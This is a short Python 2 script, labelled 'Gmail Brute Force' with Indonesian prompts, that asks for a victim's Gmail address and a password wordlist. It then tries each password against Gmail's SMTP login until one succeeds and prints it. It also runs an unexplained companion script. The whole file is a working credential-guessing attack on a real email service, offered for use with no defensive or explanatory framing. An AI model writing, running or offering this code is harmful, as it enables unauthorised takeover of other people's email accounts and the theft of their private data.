#!/usr/bin/python


import smtplib
import os

os.system("clear")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

os.system("python yuker.py")

print "[!] Gmail Brute Force [!]"

user = raw_input("\nMasukkan Gmail Korban : ")
passwfile = raw_input("\nMasukkan Wordlist : ")
passwfile = open(passwfile, "r")

for password in passwfile:
		try:
				smtpserver.login(user, password)
		
				print "\n[!] Password Found : %s" % password
				break
		
		except smtplib.SMTPAuthenticationError:
				print "\n[!] Mencoba Password : %s" % password
